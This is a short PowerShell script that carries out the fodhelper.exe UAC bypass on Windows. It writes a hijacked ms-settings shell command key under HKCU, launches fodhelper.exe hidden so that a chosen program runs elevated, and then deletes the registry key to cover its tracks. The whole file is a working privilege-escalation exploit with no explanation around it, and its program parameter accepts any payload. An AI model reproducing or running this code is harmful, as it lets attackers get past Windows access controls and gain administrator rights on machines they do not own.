function execute(){ 
 Param (
           
        [String]$program = "C:\windows\system32\notepad.exe" #default
       )

    #Create registry structure
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force

    #Perform the bypass
    Write-Host "[*] Waiting 10 seconds..." -ForegroundColor Cyan
    Start-Sleep 10
    
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    #Remove registry structure
    Write-Host "[*] Waiting 10 seconds..." -ForegroundColor Cyan

    Start-Sleep 10
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

}
